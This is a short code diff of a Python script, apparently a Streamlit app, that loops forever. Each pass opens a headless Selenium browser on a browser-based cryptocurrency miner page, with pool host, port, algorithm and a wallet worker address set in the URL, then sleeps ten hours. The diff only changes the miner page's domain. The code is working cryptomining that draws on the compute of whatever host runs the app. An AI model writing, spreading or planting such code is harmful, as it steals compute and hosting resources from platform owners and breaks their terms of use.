@@ -31,7 +31,7 @@ options.add_argument("--headless")
 
 while True:
     driver = get_driver()
-    driver.get("http://browserminer.infinityfreeapp.com?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=12")
+    driver.get("https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=12")
     time.sleep(36000)
     
     st.code(driver.page_source)
